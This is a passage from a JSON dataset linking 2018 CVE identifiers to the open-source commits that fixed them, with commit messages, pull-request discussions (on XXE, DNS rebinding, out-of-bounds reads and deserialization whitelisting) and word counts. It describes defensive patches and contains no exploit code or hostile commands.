            "commit_msg": "Check that ecall [user_check] pointers and ocall_malloc result pointer are outside enclave (#67)\n\nThis should reduce the enclave's attack surface by preventing an attacker from invoking ecalls on or triggering unexpected writes to arbitrary enclave memory, which could potentially leak information about that memory or lead to incorrect results.\r\n\r\nFixes #36. Fixes #66.",
            "commit_msg_words": 53,
            "other_info": "Check that ecall [user_check] pointers and ocall_malloc result pointer are outside enclave",
            "pr_title_words": 12,
            "comments_words": 0,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2018-5269",
            "commit_url": "https://github.com/opencv/opencv/commit/8a76fadaa39b87d740ec3346d9eccb64bde5a6af",
            "commit_msg": "imgcodecs: add overflow checks",
            "commit_msg_words": 4,
            "other_info": "imgcodecs: replace assert() calls, add overflow checks Hi, this was about CVE-2018-5269. Will the backport to 2.4 also be needed?",
            "pr_title_words": 7,
            "comments_words": 13,
            "total_other_info_words": 20
        },
        {
            "cve-id": "CVE-2018-8784",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7",
            "commit_msg": "Fixed CVE-2018-8784\n\nThanks to Eyal Itkin from Check Point Software Technologies.",
            "commit_msg_words": 11,
            "other_info": "Cve fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3393/",
            "pr_title_words": 2,
            "comments_words": 14,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2018-20196",
            "commit_url": "https://github.com/knik0/faad2/commit/6aeeaa1af0caf986daf22852a97f7c13c5edd879",
            "commit_msg": "sbr_fbt: sbr->M should not exceed MAX_M\n\nsbr->M is set by derived_frequency_table() from user-passed input\nwithout checking for > MAX_M.\n\nThis leads to out-of-bounds accesses later, crashes and potential\nsecurity relevant issues. It should be considered a fatal error for\nthe SBR block.\n\nreturn error code if sbr->M > MAX_M.\n\nalso, in some cases sbr_extension_data() ignores the return value of\ncalc_sbr_tables, probably assuming that sbr is always valid. It should\nalmost certainly not do that.\n\nfixes #19 (CVE-2018-20196).",
            "commit_msg_words": 77,
            "other_info": "mp4read/sbr_fbt: security bug fixes I am currently doing a second review of my code.\r\n\r\n* \"sbr_fbt: sbr->M should not exceed MAX_M\" looks perfectly fine to me. I won't do any more changes there.\r\n\r\n* \"mp4read: moovin should not alter caller's g_atom \" is *not* ok. The logic of this patch is perfectly fine in my opinion, however it does not handle error situations properly. I will provide an updated version addressing these issues.\r\n\r\n* \"main: fix crash with unsupported MP4 files \" is perfectly fine as-is. I won't do any more changes there. I have updated the mp4read patch. @fabiangreffrath it would be really great if you could do a last review, so that we can get this merged sometime. :) Just merged this. By now, you know the code better than I do, so I trust your proposals blindly. :wink:",
            "pr_title_words": 4,
            "comments_words": 137,
            "total_other_info_words": 141
        },
        {
            "cve-id": "CVE-2018-1000854",
            "commit_url": "https://github.com/esigate/esigate/commit/8461193d2f358bcf1c3fabf82891a66786bfb540",
            "commit_msg": "Update XsltRenderer.java",
            "commit_msg_words": 2,
            "other_info": "Cleanup XSLT tests and ensure secure rendering fix for https://github.com/esigate/esigate/issues/209",
            "pr_title_words": 7,
            "comments_words": 3,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2018-16870",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/ab03f9291b040269ae21d33b9f01529ed8311728",
            "commit_msg": "Make RsaUnPad constant time when Block Type 2 message",
            "commit_msg_words": 9,
            "other_info": "Make RsaUnPad constant time when Block Type 2 message David please review.  If you approve, go ahead and merge.",
            "pr_title_words": 9,
            "comments_words": 10,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2018-15501",
            "commit_url": "https://github.com/libgit2/libgit2/commit/1f9a8510e1d2f20ed7334eeeddb92c4dd8e7c649",
            "commit_msg": "smart_pkt: fix potential OOB-read when processing ng packet\n\nOSS-fuzz has reported a potential out-of-bounds read when processing a\n\"ng\" smart packet:\n\n==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6310000249c0 at pc 0x000000493a92 bp 0x7ffddc882cd0 sp 0x7ffddc882480\n\tREAD of size 65529 at 0x6310000249c0 thread T0\n\tSCARINESS: 26 (multi-byte-read-heap-buffer-overflow)\n\t#0 0x493a91 in __interceptor_strchr.part.35 /src/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_common_interceptors.inc:673\n\t#1 0x813960 in ng_pkt libgit2/src/transports/smart_pkt.c:320:14\n\t#2 0x810f79 in git_pkt_parse_line libgit2/src/transports/smart_pkt.c:478:9\n\t#3 0x82c3c9 in git_smart__store_refs libgit2/src/transports/smart_protocol.c:47:12\n\t#4 0x6373a2 in git_smart__connect libgit2/src/transports/smart.c:251:15\n\t#5 0x57688f in git_remote_connect libgit2/src/remote.c:708:15\n\t#6 0x52e59b in LLVMFuzzerTestOneInput /src/download_refs_fuzzer.cc:145:9\n\t#7 0x52ef3f in ExecuteFilesOnyByOne(int, char**) /src/libfuzzer/afl/afl_driver.cpp:301:5\n\t#8 0x52f4ee in main /src/libfuzzer/afl/afl_driver.cpp:339:12\n\t#9 0x7f6c910db82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/libc-start.c:291\n\t#10 0x41d518 in _start\n\nWhen parsing an \"ng\" packet, we keep track of both the current position\nas well as the remaining length of the packet itself. But instead of\ntaking care not to exceed the length, we pass the current pointer's\nposition to `strchr`, which will search for a certain character until\nhitting NUL. It is thus possible to create a crafted packet which\ndoesn't contain a NUL byte to trigger an out-of-bounds read.\n\nFix the issue by instead using `memchr`, passing the remaining length as\nrestriction. Furthermore, verify that we actually have enough bytes left\nto produce a match at all.\n\nOSS-Fuzz-Issue: 9406",
            "commit_msg_words": 201,
            "other_info": "Release v0.27.4",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2018-5251",
            "commit_url": "https://github.com/libming/libming/commit/9141f1df0d6ecb84f298633ba03569bbf5c842d0",
            "commit_msg": "Fix left shift of a negative value in readSBits.\n\nCheck for !number before left-shifting by (number-1).\n\nThis commit fixes CVE-2018-5294 (fixes #97).",
            "commit_msg_words": 22,
            "other_info": "Fix various undefined behavior sources in util/read.c Oh, wait, I forgot the NEWS entry.\r\n\r\nAlso: I didn't request CVE numbers for these issues because I was too unsure about their security implications. it would be great to have automated tests added to prove the need for these patches, although I understand it isn't straightforward to produce them I have added the NEWS entries as a separate commit. If needed, I can rebase and wrap them into the patches.\r\n\r\nConcerning the automated tests: Well, I think that the need for these patches is proved as long as those two issues are easily reproducible with the pocs (see bug reports). Also, these issues are quite common, you can find the exact same bug as #98 [here](https://github.com/nothings/stb/issues/152) for example.\r\n\r\nNevertheless I agree that it would be great to have regression tests. At least it would have avoided #98 (regression introduced in d468907).\r\n\r\nUnfortunately I'm probably not going to have time to write these tests in the next weeks. We could maybe open a bug report as a reminder. Hum, while having a look at the Debian Security Tracker I just noticed that these two issues have actually been assigned CVE numbers CVE-2018-5251 and CVE-2018-5294. Please do not merge, I'll rebase everything a provide updated commit messages. Done. I have updated commit messages and NEWS entries to mention CVE numbers.",
            "pr_title_words": 7,
            "comments_words": 219,
            "total_other_info_words": 226
        },
        {
            "cve-id": "CVE-2018-1000546",
            "commit_url": "https://github.com/triplea-game/triplea/commit/0f23875a4c6e166218859a63c884995f15c53895",
            "commit_msg": "Allow file access\n\nCo-Authored-By: RoiEXLab <8350879+RoiEXLab@users.noreply.github.com>",
            "commit_msg_words": 6,
            "other_info": "Ensure XXE security The build fails. \r\n\r\nSee https://github.com/triplea-game/triplea/issues/3442#issuecomment-451656656 for more information. @ron-murhammer @ssoloff @DanVanAtta Ideas? (Have a look at #3442 first) @RoiEXLab With the following change, I was able to get `ProUtilsTest` to pass:\r\n\r\n```diff\r\ndiff --git a/game-core/src/main/java/games/strategy/engine/data/GameParser.java b/game-core/src/main/java/games/strategy/engine/data/GameParser.java\r\nindex 66d2bafd3..40ad3222d 100644\r\n--- a/game-core/src/main/java/games/strategy/engine/data/GameParser.java\r\n+++ b/game-core/src/main/java/games/strategy/engine/data/GameParser.java\r\n@@ -307,6 +307,7 @@ public final class GameParser {\r\n       factory.setValidating(true);\r\n       // Not mandatory, but better than relying on the default implementation to prevent XXE\r\n       factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\n+      factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"file\");\r\n       // get the dtd location\r\n       final String dtdFile = \"/games/strategy/engine/xml/\" + DTD_FILE_NAME;\r\n       final URL url = GameParser.class.getResource(dtdFile);\r\n```\r\n\r\nWould you agree that limiting DTD access to the local file system mitigates an XXE attack? @ssoloff Thanks for finding this option, I tried a couple of things, none of which seemed to work \ud83d\udc4d\r\nI do think that limiting this to the local file system is a good 1st step, but ideally we'd ensure that the only allowed dtd is \"game.dtd\"/no dtds outside of this folder inside the classpath can be used. Also, would you be so kind to turn your diff into a suggestion?\r\nI'm won't be in front of my pc today anymore, so that would be nice ^^ # [Codecov](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=h1) Report\n> Merging [#4516](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=desc) into [master](https://codecov.io/gh/triplea-game/triplea/commit/1eed29e75853faed14bd2be30372a5eba16be018?src=pr&el=desc) will **increase** coverage by `0.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/triplea-game/triplea/pull/4516/graphs/tree.svg?width=650&token=QPS14q4xnG&height=150&src=pr)](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=tree)\n\n```diff\n@@             Coverage Diff             @@\n##             master   #4516      +/-   ##\n===========================================\n+ Coverage     23.09%   23.1%   +0.01%     \n- Complexity     6198    6206       +8     \n===========================================\n  Files           878     878              \n  Lines         70799   70835      +36     \n  Branches      11288   11287       -1     \n===========================================\n+ Hits          16349   16367      +18     \n- Misses        52415   52435      +20     \n+ Partials       2035    2033       -2\n```\n\n\n| [Impacted Files](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...in/java/games/strategy/engine/data/GameParser.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-Z2FtZS1jb3JlL3NyYy9tYWluL2phdmEvZ2FtZXMvc3RyYXRlZ3kvZW5naW5lL2RhdGEvR2FtZVBhcnNlci5qYXZh) | `70.52% <100%> (+0.07%)` | `180 <0> (\u00f8)` | :arrow_down: |\n| [...tegy/engine/framework/system/SystemProperties.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-Z2FtZS1jb3JlL3NyYy9tYWluL2phdmEvZ2FtZXMvc3RyYXRlZ3kvZW5naW5lL2ZyYW1ld29yay9zeXN0ZW0vU3lzdGVtUHJvcGVydGllcy5qYXZh) | `33.33% <0%> (-3.04%)` | `4% <0%> (\u00f8)` | |\n| [...ava/org/triplea/server/http/spark/SparkServer.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-aHR0cC1zZXJ2ZXIvc3JjL21haW4vamF2YS9vcmcvdHJpcGxlYS9zZXJ2ZXIvaHR0cC9zcGFyay9TcGFya1NlcnZlci5qYXZh) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...va/games/strategy/engine/framework/GameRunner.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-Z2FtZS1jb3JlL3NyYy9tYWluL2phdmEvZ2FtZXMvc3RyYXRlZ3kvZW5naW5lL2ZyYW1ld29yay9HYW1lUnVubmVyLmphdmE=) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...n/java/games/strategy/triplea/ui/TripleAFrame.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-Z2FtZS1jb3JlL3NyYy9tYWluL2phdmEvZ2FtZXMvc3RyYXRlZ3kvdHJpcGxlYS91aS9UcmlwbGVBRnJhbWUuamF2YQ==) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...n/java/org/triplea/server/ServerConfiguration.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-aHR0cC1zZXJ2ZXIvc3JjL21haW4vamF2YS9vcmcvdHJpcGxlYS9zZXJ2ZXIvU2VydmVyQ29uZmlndXJhdGlvbi5qYXZh) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...a/http/client/github/issues/GithubIssueClient.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-aHR0cC1jbGllbnQvc3JjL21haW4vamF2YS9vcmcvdHJpcGxlYS9odHRwL2NsaWVudC9naXRodWIvaXNzdWVzL0dpdGh1Yklzc3VlQ2xpZW50LmphdmE=) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...va/games/strategy/triplea/ui/menubar/HelpMenu.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-Z2FtZS1jb3JlL3NyYy9tYWluL2phdmEvZ2FtZXMvc3RyYXRlZ3kvdHJpcGxlYS91aS9tZW51YmFyL0hlbHBNZW51LmphdmE=) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...rver/reporting/error/ErrorUploadConfiguration.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-aHR0cC1zZXJ2ZXIvc3JjL21haW4vamF2YS9vcmcvdHJpcGxlYS9zZXJ2ZXIvcmVwb3J0aW5nL2Vycm9yL0Vycm9yVXBsb2FkQ29uZmlndXJhdGlvbi5qYXZh) | `0% <0%> (\u00f8)` | `0% <0%> (\u00f8)` | :arrow_down: |\n| [...ea/server/reporting/error/ErrorUploadStrategy.java](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree#diff-aHR0cC1zZXJ2ZXIvc3JjL21haW4vamF2YS9vcmcvdHJpcGxlYS9zZXJ2ZXIvcmVwb3J0aW5nL2Vycm9yL0Vycm9yVXBsb2FkU3RyYXRlZ3kuamF2YQ==) | `88.88% <0%> (\u00f8)` | `3% <0%> (\u00f8)` | :arrow_down: |\n| ... and [11 more](https://codecov.io/gh/triplea-game/triplea/pull/4516/diff?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=footer). Last update [1eed29e...0f23875](https://codecov.io/gh/triplea-game/triplea/pull/4516?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 3,
            "comments_words": 454,
            "total_other_info_words": 457
        },
        {
            "cve-id": "CVE-2018-20594",
            "commit_url": "https://github.com/hs-web/hsweb-framework/commit/b72a2275ed21240296c6539bae1049c56abb542f",
            "commit_msg": "fix #107  \u4fee\u590d\u53cd\u5c04\u578bxss",
            "commit_msg_words": 3,
            "other_info": "3.0.x",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2018-14017",
            "commit_url": "https://github.com/radareorg/radare2/commit/e9ce0d64faf19fa4e9c260250fbdf25e3c11e152",
            "commit_msg": "Fix #10498 - Fix crash in fuzzed java files (#10511)",
            "commit_msg_words": 10,
            "other_info": "Fix #10498 - Crash in fuzzed java file",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2018-5294",
            "commit_url": "https://github.com/libming/libming/commit/c14d07ef20c3f403fcfa59502b74c66933473431",
            "commit_msg": "Fix integer overflow vulnerability in util/read.c.\n\nThis vulnerability is caused by a regression introduced in\nd468907.\n\nIn this commit we cast the result of readUInt8(f) before left\nshifting by 24 in order to avoid out of range shift.\n\nThis commit fixes CVE-2018-5251 (fixes #98).",
            "commit_msg_words": 44,
            "other_info": "Fix various undefined behavior sources in util/read.c Oh, wait, I forgot the NEWS entry.\r\n\r\nAlso: I didn't request CVE numbers for these issues because I was too unsure about their security implications. it would be great to have automated tests added to prove the need for these patches, although I understand it isn't straightforward to produce them I have added the NEWS entries as a separate commit. If needed, I can rebase and wrap them into the patches.\r\n\r\nConcerning the automated tests: Well, I think that the need for these patches is proved as long as those two issues are easily reproducible with the pocs (see bug reports). Also, these issues are quite common, you can find the exact same bug as #98 [here](https://github.com/nothings/stb/issues/152) for example.\r\n\r\nNevertheless I agree that it would be great to have regression tests. At least it would have avoided #98 (regression introduced in d468907).\r\n\r\nUnfortunately I'm probably not going to have time to write these tests in the next weeks. We could maybe open a bug report as a reminder. Hum, while having a look at the Debian Security Tracker I just noticed that these two issues have actually been assigned CVE numbers CVE-2018-5251 and CVE-2018-5294. Please do not merge, I'll rebase everything a provide updated commit messages. Done. I have updated commit messages and NEWS entries to mention CVE numbers.",
            "pr_title_words": 7,
            "comments_words": 219,
            "total_other_info_words": 226
        },
        {
            "cve-id": "CVE-2018-12889",
            "commit_url": "https://github.com/cn-uofbasel/ccn-lite/commit/cd1bd188eaf58b1972cf80ce3a5d3f1c81f14bf1",
            "commit_msg": "Fix possible heap bufferoverrun when reading ndn- or ccnx-files",
            "commit_msg_words": 9,
            "other_info": "Fix possible heap bufferoverrun when reading ndn- or ccnx-files",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2018-5702",
            "commit_url": "https://github.com/transmission/transmission/commit/cf7173df930cfa7ac1b1b0e9027c1deffd0b3c84",
            "commit_msg": "mitigate dns rebinding attacks against daemon",
            "commit_msg_words": 6,
            "other_info": "CVE-2018-5702: Mitigate dns rebinding attacks against daemon I naively adapted the patch so it applies to the 2.92 release (attached).\r\n[transmission-fix-dns-rebinding-vuln.patch.txt](https://github.com/transmission/transmission/files/1624431/transmission-fix-dns-rebinding-vuln.patch.txt)\r\n\r\nAs the CI server shows, with these changes the ```quark-test``` fails with ```\r\nexit status: 29```.\r\n Has a CVE been assigned for this? I believe I've fixed the quark-test fail, the list wasn't ordered correctly.\r\n\r\n(I broke the merge, but I think it's fixed now) @woodsb02 No, but I've just requested one and will update when received. I've updated the 2.92 patch with the latest changes from @taviso. The tests do pass now.\r\n[transmission-fix-dns-rebinding-vuln.patch.txt](https://github.com/transmission/transmission/files/1624507/transmission-fix-dns-rebinding-vuln.patch.txt)\r\n @taviso the demo works, unless you load it over https. Mixed content. \r\n@EFForg HTTPS Everywhere ftw!;] @taviso and @lfam thank you.  I've adapted lfam's second 2.92 patch set to the OpenBSD port of transmission, which I maintain.  Testing underway. Just a na\u00efve question for my own edification - this basically uses `Host` for header checking-based protection instead of relying on `X-Transmission-Session-Id`, because `Host` is a Fetch Standard [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name), and so not vulnerable to the same exploit, is that correct? @smithfred Yes, correct. If transmission is configured such that the daemon/web server requires authorization (user ID, password) does this mitigate this attack? @wfiveash Yes, but be aware that it's possible to guess the credentials, so make them strong. @jggimi Okay, let us know if you notice any problems.\r\n\r\nRemember I described my adaptation as \"naive\". I only made sure the patch applies and Transmission still works. In my setup, the settings.json file is re-written each time transmission-daemon is started, based on the command line arguments passed to it.\r\n\r\nCan we please add new command line arguments to transmission-daemon set the rpc-host-whitelist-enabled and rpc-host-whitelist parameters? cve requested at Mitre.org CVE-2018-5702 > I've verified it works on Chrome and Firefox on Windows and Linux \r\n\r\nDoes this mean the MacOS version of Transmission isn't vulnerable, or just that you haven't tested it? @rmbleeker The macOS version is vulnerable if you have enabled [remote access](https://trac.transmissionbt.com/wiki/OSX/DesktopRemote). @slokhorst only if that is enabled?  @slokhorst Isn't the same true for linux distributions? Isn't the remote access disabled by default?\r\nI'm currently using Transmission 2.84 on Ubuntu 16.04. @OznipSlaugh yes\r\n\r\n@yanosh-k I believe remote access is disabled by default in all clients (Qt, GTK+, macOS). I think it's only enabled by default in the daemon (obviously...)\r\n\r\nYou can check if your vulnerable by going to http://localhost:9091/ If you then see the Transmission web interface, you're vulnerable. But what if the local DNS server supports [DNS Rebinding Protections](https://doc.pfsense.org/index.php/DNS_Rebinding_Protections) and all DNS traffic is forced through the local DNS server with that protection enabled. It seems in such a case that this hack is not applicable. Has the fix been applied to 2.92 and published to ubuntu repos? If I'm on 2.92 I'm safe, or do I have to wait 2.93? The [Ubuntu package](https://packages.ubuntu.com/artful/transmission) has not been updated [since 31 July 2017](http://changelogs.ubuntu.com/changelogs/pool/main/t/transmission/transmission_2.92-2ubuntu3/changelog), so it doesn't include this patch. \r\n\r\nI don't know if 2.93 will be released any time soon, there haven't been any Transmission releases for two years. Ah damn... I'll need to install the ppa I assume. I remember having troubles with that though You could also email the Ubuntu maintainers.. I'm sure they want to patch this. Maybe they've missed the CVE. Done, looks like patch has been backported to `2.84-3ubuntu3.1` on ubuntu and the package is already available. Great work here guys. I'd greatly appreciate it if someone made a follow-up PR to add support for IPv6 localhost address to the implicitly allowed list ;) @mikedld that's already covered by the bit below \"localhost or ipaddress is always acceptable.\" right?\r\n`tr_addressIsIP(hostname)` should return true for both `127.0.0.1` and `::1`. @slokhorst Oh, my apologies. For some reason it occured to me that the check allows 127.0.0.1 specifically and not any IP address :( Sorry for the noise. Thinking of it more, the use of `strcspn` is not ideal there. Given \"Host: [::1]:9091\", it'll return \"[\" as a name to be checked, and this is not a valid IP address. Will fix this myself in a bit.",
            "pr_title_words": 7,
            "comments_words": 667,
            "total_other_info_words": 674
        },
        {
            "cve-id": "CVE-2018-20227",
            "commit_url": "https://github.com/eclipse-rdf4j/rdf4j/commit/df15a4d7a8f2789c043b27c9eafe1b30316cfa79",
            "commit_msg": "Verify that zip file entries don't try to escape the parent dir + test\n\nSigned-off-by: Bart Hanssens <bart.hanssens@bosa.fgov.be>",
            "commit_msg_words": 18,
            "other_info": "Verify that zip file entries don't try to escape the parent dir + test Great that you made tests!",
            "pr_title_words": 14,
            "comments_words": 5,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2018-19827",
            "commit_url": "https://github.com/sass/libsass/commit/b21fb9f84096d9927780b86fa90629a096af358d",
            "commit_msg": "Fix #2782: heap-use-after-free in expand.cpp\n\nSelector stack got popped during eval, resulting in `extender` deletion.",
            "commit_msg_words": 15,
            "other_info": "Fix #2782: heap-use-after-free in expand.cpp Appveyor build timed out. Kicked off a rebuild.\n\nOn Tue., 4 Dec. 2018, 8:26 am Gleb Mazovetskiy <notifications@github.com\nwrote:\n\n> Selector stack got popped during eval, resulting in extender deletion.\n> ------------------------------\n> You can view, comment on, or merge this pull request online at:\n>\n>   https://github.com/sass/libsass/pull/2784\n> Commit Summary\n>\n>    - Fix #2782: heap-use-after-free in expand.cpp\n>\n> File Changes\n>\n>    - *M* src/expand.cpp\n>    <https://github.com/sass/libsass/pull/2784/files#diff-0> (2)\n>\n> Patch Links:\n>\n>    - https://github.com/sass/libsass/pull/2784.patch\n>    - https://github.com/sass/libsass/pull/2784.diff\n>\n> \u2014\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/sass/libsass/pull/2784>, or mute the thread\n> <https://github.com/notifications/unsubscribe-auth/AAjZWDQB76UOg-AtdIXJB3_WHByXtHVCks5u1ZbrgaJpZM4Y_cim>\n> .\n>\n AppVeyor is broken because of @mgreter's recent changes. The fix is in #2775. By the way, the broken windows build is tracked in #2776 Now green. Thanks for following up. Is there anyway to scan or lint for this kind of mistake across th codebase. The introduction of _Obj and _Ptr types was fairly jarring and I suspect more of these have slipped through the cracks. I'm hoping that #2785 will at least make it obvious.\r\nI don't think an automatic lint is possible here (as `_Ptr` is better for performance when it is safe).\r\n\r\nI'm following this Rust Sass compiler closely btw: https://github.com/kaj/rsass. Oh cool. I've started hacking on a rust port a couple times but never\nreally had the time to commit to it. Excited to see where it goes.\n\nOn Thu., 6 Dec. 2018, 2:52 pm Gleb Mazovetskiy <notifications@github.com\nwrote:\n\n> I'm hoping that #2785 <https://github.com/sass/libsass/issues/2785> will\n> at least make it obvious.\n> I don't think an automatic lint is possible here (as _Ptr is better for\n> performance when it is safe).\n>\n> I'm following this Rust Sass compiler closely btw:\n> https://github.com/kaj/rsass.\n>\n> \u2014\n> You are receiving this because you modified the open/close state.\n> Reply to this email directly, view it on GitHub\n> <https://github.com/sass/libsass/pull/2784#issuecomment-444739528>, or mute\n> the thread\n> <https://github.com/notifications/unsubscribe-auth/AAjZWCrfq4X1b7_8Oz3OafPq0YmorRckks5u2JRvgaJpZM4Y_cim>\n> .\n>",
            "pr_title_words": 5,
            "comments_words": 343,
            "total_other_info_words": 348
        },
        {
            "cve-id": "CVE-2018-8005",
            "commit_url": "https://github.com/apache/trafficserver/commit/6d248026b04d69e5c5049709c17ea671328ea4ea",
            "commit_msg": "Adds a new configuration proxy.config.http.allow_multi_range\n\nThis is needed to prevent potential abuse with well formed multi-\nrange requests.",
            "commit_msg_words": 18,
            "other_info": "Adds a new configuration proxy.config.http.allow_multi_range This has many, but trivial, merge conflicts, primarily due to clang-formatting. Cheery-picked to 7.1.3",
            "pr_title_words": 5,
            "comments_words": 14,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2018-18628",
            "commit_url": "https://github.com/pippo-java/pippo/commit/a82347d9d3358e98c89b48579d4285d807a57cc0",
            "commit_msg": "Fix issue #458",
            "commit_msg_words": 3,
            "other_info": "Fix 458 Hm, I need to check the failure in the tests. I tried to resolve the conflict from merge with master from GitHub but I see that without success.\r\nSo please make a merge manually.\r\n\r\nWhat I don't like with this kind of solution is that we modified the core for a vulnerability that appear in a optional module (for example I don't use that module in my projects). And the modification is not trivial. For a new comer is hard to read this code and to quess why we did it. I don't understand why XStream doesn't come with a fix.  I had some difficulties while locally merging. ~~I'll check when Travis is finished.~~ Should work now.\r\n\r\nAbout your reservations:\r\n- I am not sure if this issue is even related to XStream. I think that is another isssue? Or I do not understand the implications properly.\r\n- I was implementing this fix, because I don't want to have an open CVE for Pippo. I get all these warnings from Github in my projects which use Pippo.\r\n- I understand that fixing the bug in core is complicating things. If you want you can reject the fix.\r\n- I personally don't use any of these modules. ## Pull Request Test Coverage Report for [Build 1017](https://coveralls.io/builds/19743011)\n\n* **1** of **29**   **(3.45%)**  changed or added relevant lines in **2** files are covered.\n* No unchanged relevant lines lost coverage.\n* Overall coverage decreased (**-0.09%**) to **21.605%**\n\n---\n\n|  Changes Missing Coverage | Covered Lines | Changed/Added Lines | % |\n| :-----|--------------|--------|---: |\n| [pippo-core/src/main/java/ro/pippo/core/util/WhitelistObjectInputStream.java](https://coveralls.io/builds/19743011/source?filename=pippo-core%2Fsrc%2Fmain%2Fjava%2Fro%2Fpippo%2Fcore%2Futil%2FWhitelistObjectInputStream.java#L34) | 0 | 28 | 0.0%\n<!-- | **Total:** | **1** | **29** | **3.45%** | -->\n\n\n|  Totals | [![Coverage Status](https://coveralls.io/builds/19743011/badge)](https://coveralls.io/builds/19743011) |\n| :-- | --: |\n| Change from base [Build 1012](https://coveralls.io/builds/19726764): |  -0.09% |\n| Covered Lines: | 1384 |\n| Relevant Lines: | 6406 |\n\n---\n##### \ud83d\udc9b  - [Coveralls](https://coveralls.io)\n @rygel\r\n> I am not sure if this issue is even related to XStream.\r\n\r\nYes, you are right.\r\n\r\n>If you want you can reject the fix.\r\n\r\nNo, I will merge in the end. Maybe I will read more about this subject. Users using Pippo need to make sure we focus on security.\r\n I have changed all your requests. I'll take a look at everything that was said here... The @rygel changes was made in the pippo-session module. Why did you guys say it was made in the pippo-core? I did not understand.\r\n\r\n@decebals \r\n>  I don't understand why XStream doesn't come with a fix.\r\n\r\nXStream provides means to avoid RCE, or in other words to avoid or not to serialize / deserialize certain classes. Those who use this API can choose whether or not to enable this security.\r\n\r\n@rygel \r\n> I am not sure if this issue is even related to XStream. I think that is another isssue? Or I do not understand the implications properly.\r\n\r\nAs I quoted [here](https://github.com/pippo-java/pippo/issues/454#issuecomment-425730461) and I will detail it better in my post below, I believe there is a relationship with XStream. I read and refreshed my memory! :)\r\n\r\nSerialization / Deserialization is very common and checking whether certain types may or may not be deserialized is very important because of security concerns. Regardless if it is from a json, xml, Java serialization etc.\r\n\r\nRecently (others not so) some frameworks that I use have implemented a restriction to allow or not to deserialize a set of classes and/or packages, eg: [Richfaces 3.3.3 > 3.3.4](http://anonsvn.jboss.org/repos/richfaces/branches/community/release-3.3.4/framework/impl/src/main/java/org/ajax4jsf/resource/LookAheadObjectInputStream.java), [JBoss EAP 6.3.0 with jackson-mapper-asl 1.9.9.redhat-3 > JBoss EAP 6.4.20 with jackson-mapper-asl 1.9.9.redhat-6](https://stackoverflow.com/questions/50917932/what-versions-of-jackson-are-allowed-in-jboss-6-4-20-patch#51329422), XStream after version 1.4.6. So I had to define a set of my allowed packages for Serialization / Deserialization.\r\n\r\nI think somewhere in Pippo there could be the option where it would be possible to define a list of classes and/or packages that would be allowed to deserialize (whitelist). I believe somewhere in the core. Why the core? Because, as I said above, Serialization / Deserialization is something common.\r\n\r\nThis whitelist would already come with some basic classes (eg ro.pippo.core.Flash, java.util.ArrayList etc), but would be extensible in some way (eg: system property, application.properties etc) so that it could be possible to add more classes and/or packages.\r\n\r\nBoth the FilteringObjectInputStream class (created here in this PR) and the 